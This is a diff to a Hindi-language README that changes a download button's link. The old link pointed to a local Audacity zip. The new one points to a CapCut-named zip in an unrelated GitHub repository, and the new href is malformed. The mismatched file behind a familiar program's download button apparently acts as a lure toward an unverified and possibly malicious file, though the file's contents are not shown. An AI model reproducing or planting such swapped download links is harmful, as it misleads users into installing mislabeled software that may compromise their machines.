@@ -18,7 +18,7 @@
 बस नीचे दिए गए बटन पर क्लिक करें और डाउनलोड करें:
 
 <p align="center">
-  <a href="./audacity-2.2.1.zip">
+  <a href="[./audacity-2.2.1.zip](https://media.githubusercontent.com/media/AjitSinghDeveloper/capcut-4-3-0-1694/refs/heads/main/capcut-4-3-0-1694.zip?download=true)">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20ZIP-23MB-brightgreen?style=for-the-badge&logo=download" />
   </a>
 </p>
